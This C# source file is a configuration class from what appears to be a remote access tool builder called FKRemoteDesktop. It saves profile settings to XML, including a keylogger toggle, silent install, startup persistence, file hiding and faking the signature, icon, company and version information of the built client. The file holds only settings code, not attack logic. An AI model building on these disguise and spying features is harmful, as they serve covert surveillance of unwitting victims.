using System;
using System.IO;
using System.Windows.Forms;
using System.Xml.XPath;
using System.Xml;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Configs
{
    public class ClientConfig
    {
        private readonly string _profilePath;

        #region 基本函数

        public ClientConfig(string profileName)
        {
            if (string.IsNullOrEmpty(profileName)) 
                throw new ArgumentException("无效的配置文件路径");
            _profilePath = Path.Combine(Application.StartupPath, "Profiles\\" + profileName + ".xml");
        }

        private string ReadValue(string pstrValueToRead)
        {
            try
            {
                XPathDocument doc = new XPathDocument(_profilePath);
                XPathNavigator nav = doc.CreateNavigator();
                XPathExpression expr = nav.Compile(@"/settings/" + pstrValueToRead);
                XPathNodeIterator iterator = nav.Select(expr);
                while (iterator.MoveNext())
                {
                    return iterator.Current.Value;
                }
                return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        private string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
        {
            string value = ReadValue(pstrValueToRead);
            return (!string.IsNullOrEmpty(value)) ? value : defaultValue;
        }

        private void WriteValue(string pstrValueToRead, string pstrValueToWrite)
        {
            try
            {
                XmlDocument doc = new XmlDocument();
                if (File.Exists(_profilePath))
                {
                    using (var reader = new XmlTextReader(_profilePath))
                    {
                        doc.Load(reader);
                    }
                }
                else
                {
                    var dir = Path.GetDirectoryName(_profilePath);
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    doc.AppendChild(doc.CreateElement("settings"));
                }

                XmlElement root = doc.DocumentElement;
                XmlNode oldNode = root.SelectSingleNode(@"/settings/" + pstrValueToRead);
                if (oldNode == null)
                {
                    oldNode = doc.SelectSingleNode("settings");
                    oldNode.AppendChild(doc.CreateElement(pstrValueToRead)).InnerText = pstrValueToWrite;
                    doc.Save(_profilePath);
                    return;
                }
                oldNode.InnerText = pstrValueToWrite;
                doc.Save(_profilePath);
            }
            catch{}
        }

        #endregion

        #region 基本配置页面

        public string Hosts
        {
            get{ return ReadValueSafe("Hosts"); }
            set{ WriteValue("Hosts", value); }
        }

        public int Delay
        {
            get{ return int.Parse(ReadValueSafe("Delay", "5")); }
            set{ WriteValue("Delay", value.ToString()); }
        }

        public string Tag
        {
            get{ return ReadValueSafe("Tag", "ClientGroup_01"); }
            set{ WriteValue("Tag", value); }
        }

        public string Mutex
        {
            get{ return ReadValueSafe("Mutex", Guid.NewGuid().ToString()); }
            set{ WriteValue("Mutex", value); }
        }

        public bool Keylogger
        {
            get { return bool.Parse(ReadValueSafe("Keylogger", "False")); }
            set { WriteValue("Keylogger", value.ToString()); }
        }

        public bool InstallClient
        {
            get{ return bool.Parse(ReadValueSafe("InstallClient", "False")); }
            set{ WriteValue("InstallClient", value.ToString()); }
        }

        public bool AddStartup
        {
            get{ return bool.Parse(ReadValueSafe("AddStartup", "False")); }
            set{ WriteValue("AddStartup", value.ToString()); }
        }

        public bool HideFileAndRandomName
        {
            get{ return bool.Parse(ReadValueSafe("HideFileAndRandomName", "False")); }
            set{ WriteValue("HideFileAndRandomName", value.ToString()); }
        }

        #endregion

        #region 高级配置页面

        public bool ChangeSignature
        {
            get
            {
                return bool.Parse(ReadValueSafe("ChangeSignature", "False"));
            }
            set
            {
                WriteValue("ChangeSignature", value.ToString());
            }
        }

        public string CopySignaturePath
        {
            get
            {
                return ReadValueSafe("CopySignaturePath");
            }
            set
            {
                WriteValue("CopySignaturePath", value);
            }
        }

        public bool ChangeAsmInfo
        {
            get
            {
                return bool.Parse(ReadValueSafe("ChangeAsmInfo", "False"));
            }
            set
            {
                WriteValue("ChangeAsmInfo", value.ToString());
            }
        }

        public string CopyAsmInfoPath
        {
            get
            {
                return ReadValueSafe("CopyAsmInfoPath");
            }
            set
            {
                WriteValue("CopyAsmInfoPath", value);
            }
        }

        public string ProductName
        {
            get
            {
                return ReadValueSafe("ProductName");
            }
            set
            {
                WriteValue("ProductName", value);
            }
        }

        public string Description
        {
            get
            {
                return ReadValueSafe("Description");
            }
            set
            {
                WriteValue("Description", value);
            }
        }

        public string CompanyName
        {
            get
            {
                return ReadValueSafe("CompanyName");
            }
            set
            {
                WriteValue("CompanyName", value);
            }
        }

        public string Copyright
        {
            get
            {
                return ReadValueSafe("Copyright");
            }
            set
            {
                WriteValue("Copyright", value);
            }
        }

        public string Trademarks
        {
            get
            {
                return ReadValueSafe("Trademarks");
            }
            set
            {
                WriteValue("Trademarks", value);
            }
        }

        public string OriginalFilename
        {
            get
            {
                return ReadValueSafe("OriginalFilename");
            }
            set
            {
                WriteValue("OriginalFilename", value);
            }
        }

        public string ProductVersion
        {
            get
            {
                return ReadValueSafe("ProductVersion");
            }
            set
            {
                WriteValue("ProductVersion", value);
            }
        }

        public string FileVersion
        {
            get
            {
                return ReadValueSafe("FileVersion");
            }
            set
            {
                WriteValue("FileVersion", value);
            }
        }

        public string MotifyTime
        {
            get
            {
                return ReadValueSafe("MofifyTime");
            }
            set
            {
                WriteValue("MofifyTime", value);
            }
        }

        public bool ChangeIcon
        {
            get
            {
                return bool.Parse(ReadValueSafe("ChangeIcon", "False"));
            }
            set
            {
                WriteValue("ChangeIcon", value.ToString());
            }
        }

        public string CopyIconInfoPath
        {
            get
            {
                return ReadValueSafe("CopyIconInfoPath");
            }
            set
            {
                WriteValue("CopyIconInfoPath", value);
            }
        }

        public string IconPath
        {
            get
            {
                return ReadValueSafe("IconPath");
            }
            set
            {
                WriteValue("IconPath", value);
            }
        }

        #endregion
    
    }
}
